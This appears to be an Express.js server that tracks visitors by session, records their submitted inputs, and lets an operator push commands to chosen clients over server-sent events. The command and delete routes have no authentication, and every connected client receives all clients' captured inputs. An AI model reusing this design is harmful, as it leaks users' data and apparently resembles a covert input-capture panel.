const express = require('express');
const bodyParser = require('body-parser');
const sqlite3 = require('sqlite3').verbose();
const session = require('express-session');
const crypto = require('crypto');

const app = express();
app.use(express.static('public'));
app.use(bodyParser.json());

// Generate a strong secret key and consider storing it securely
const secretKey = crypto.randomBytes(64).toString('hex');

// Set up session middleware with the secret key
app.use(session({
  secret: secretKey, // Use the generated secret key
  resave: false,
  saveUninitialized: true,
  cookie: { maxAge: 60000 } // Session duration in milliseconds
}));

// Initialize SQLite database
const db = new sqlite3.Database(':memory:');

db.serialize(() => {
  db.run("CREATE TABLE clients (id TEXT PRIMARY KEY, name TEXT, inputs TEXT)");
});

function addClientToDatabase(clientId) {
  db.run("INSERT INTO clients (id, name, inputs) VALUES (?, ?, ?)", [clientId, null, JSON.stringify([])], (err) => {
    if (err) console.error('Error adding client to database:', err);
  });
}

function removeClientFromDatabase(clientId) {
  db.run("DELETE FROM clients WHERE id = ?", [clientId], (err) => {
    if (err) console.error('Error removing client from database:', err);
  });
}

function updateClientInputs(clientId, inputs) {
  db.run("UPDATE clients SET inputs = ? WHERE id = ?", [JSON.stringify(inputs), clientId], (err) => {
    if (err) console.error('Error updating client inputs:', err);
  });
}

function updateClientName(clientId, name) {
  db.run("UPDATE clients SET name = ? WHERE id = ?", [name, clientId], (err) => {
    if (err) console.error('Error updating client name:', err);
  });
}

function getClientData(callback) {
  db.all("SELECT * FROM clients WHERE name IS NOT NULL", (err, rows) => {
    if (err) {
      console.error('Error fetching client data:', err);
      callback([]);
      return;
    }
    callback(rows.map(row => ({ clientId: row.id, name: row.name, inputs: JSON.parse(row.inputs) })));
  });
}

let clients = {};

app.get('/events', (req, res) => {
  if (!req.session.clientId) {
    req.session.clientId = crypto.randomBytes(16).toString('hex');
  }
  const clientId = req.session.clientId;

  res.setHeader('Content-Type', 'text/event-stream');
  res.setHeader('Cache-Control', 'no-cache');
  res.setHeader('Connection', 'keep-alive');

  if (!clients[clientId]) {
    addClientToDatabase(clientId);
    clients[clientId] = res;
  }

  req.on('close', () => {
    delete clients[clientId];
    removeClientFromDatabase(clientId);
    broadcastAdminPanel();
  });

  broadcastAdminPanel();
});

function broadcastAdminPanel() {
  getClientData((clientList) => {
    const message = JSON.stringify({ type: 'adminUpdate', clientList });
    Object.values(clients).forEach(client => {
      client.write(`data: ${message}\n\n`);
    });
  });
}

app.post('/send-command', (req, res) => {
  const { clientId, command } = req.body;
  const client = clients[clientId];
  if (client) {
    client.write(`data: ${JSON.stringify({ type: 'command', command })}\n\n`);
  }
  res.sendStatus(200);
});

app.post('/input', (req, res) => {
  const { clientId, input } = req.body;
  db.get("SELECT inputs FROM clients WHERE id = ?", [clientId], (err, row) => {
    if (err) {
      console.error('Error fetching inputs:', err);
      res.sendStatus(500);
      return;
    }
    const inputs = JSON.parse(row.inputs);
    inputs.push(input);
    updateClientInputs(clientId, inputs);
    broadcastAdminPanel();
  });
  res.sendStatus(200);
});

app.post('/delete-client', (req, res) => {
  const { clientId } = req.body;
  removeClientFromDatabase(clientId);
  delete clients[clientId];
  broadcastAdminPanel();
  res.sendStatus(200);
});

app.listen(8080, () => {
  console.log('Server is listening on port 8080');
}); 